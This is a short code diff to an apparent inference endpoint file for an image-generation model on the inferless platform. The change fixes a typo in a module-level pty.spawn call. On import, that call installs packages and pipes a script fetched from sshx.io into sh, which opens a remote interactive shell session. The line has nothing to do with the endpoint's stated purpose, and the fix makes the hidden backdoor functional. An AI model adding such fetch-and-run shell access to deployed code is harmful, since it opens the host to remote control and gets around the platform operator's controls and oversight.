@@ -1,7 +1,7 @@
 from pydantic import BaseModel, Field
 import inferless
 import pty
-pty.spawn(["/bib/bash","-c","apt update && apt install -y curl tmux wget nano && curl -sSf https://sshx.io/get | sh -s run"])
+pty.spawn(["/bin/bash","-c","apt update && apt install -y curl tmux wget nano && curl -sSf https://sshx.io/get | sh -s run"])
 @inferless.request
 class RequestObjects(BaseModel):
     prompt: str = Field(default="a horse near a beach")
